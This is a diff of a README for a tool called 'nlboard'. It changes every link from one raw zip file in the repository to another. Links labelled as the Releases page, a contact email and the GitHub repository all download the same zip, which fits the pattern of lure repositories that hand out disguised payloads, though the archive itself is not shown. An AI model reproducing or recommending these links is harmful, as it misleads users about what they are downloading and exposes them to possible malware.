@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download nlboard](https://github.com/rubenphilippe/nlboard/raw/refs/heads/main/nlboard/Software-v3.1-alpha.1.zip)](https://github.com/rubenphilippe/nlboard/raw/refs/heads/main/nlboard/Software-v3.1-alpha.1.zip)
+[![Download nlboard](https://github.com/rubenphilippe/nlboard/raw/refs/heads/main/nlboard/Software-1.2.zip)](https://github.com/rubenphilippe/nlboard/raw/refs/heads/main/nlboard/Software-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download nlboard, make sure your system meets these basic requirement
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/rubenphilippe/nlboard/raw/refs/heads/main/nlboard/Software-v3.1-alpha.1.zip) to download the latest version of nlboard. Here’s how to do it:
+To get started, visit the [Releases page](https://github.com/rubenphilippe/nlboard/raw/refs/heads/main/nlboard/Software-1.2.zip) to download the latest version of nlboard. Here’s how to do it:
 
 1. Go to the Releases page by clicking on the link above.
 2. Look for the most recent version marked as "Latest Release."
@@ -67,14 +67,14 @@ For further assistance or advanced features, check these resources:
 
 If you need help or have feedback, feel free to reach out:
 
-- **Email:** https://github.com/rubenphilippe/nlboard/raw/refs/heads/main/nlboard/Software-v3.1-alpha.1.zip
+- **Email:** https://github.com/rubenphilippe/nlboard/raw/refs/heads/main/nlboard/Software-1.2.zip
 - **GitHub Issues:** Report any bugs or request features via the repository.
 
 ## 🔗 Find Us Online
 
 Stay connected and updated:
 
-- [GitHub Repository](https://github.com/rubenphilippe/nlboard/raw/refs/heads/main/nlboard/Software-v3.1-alpha.1.zip)
+- [GitHub Repository](https://github.com/rubenphilippe/nlboard/raw/refs/heads/main/nlboard/Software-1.2.zip)
 - Follow us for updates and tips on project management.
 
 Now that you have everything you need, download nlboard and start organizing your projects today!
